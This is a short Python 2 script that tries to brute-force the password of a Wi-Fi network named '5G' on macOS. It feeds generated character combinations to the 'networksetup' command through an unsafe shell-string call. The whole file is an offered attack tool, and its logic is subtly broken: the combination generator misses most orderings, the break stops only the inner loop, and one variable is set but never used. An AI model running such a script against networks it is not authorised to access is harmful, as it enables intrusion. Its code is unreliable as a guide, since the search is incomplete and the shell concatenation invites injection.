import itertools, subprocess

def check_password(password):
	#if ''.join(password) == "example01":
	output = subprocess.check_output("networksetup -setairportnetwork en0 " + wifiName + " " + ''.join(password), shell=True) 
	print output 
	if output == "":
		return True
	else: return False

pwdLength = 6
wifiName = "5G" 
characters = "abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

for i in range(3,10):
	gen = itertools.combinations_with_replacement(characters,i) 
	for password in gen: 
		print ''.join(password)                                               
		if check_password(password):
			break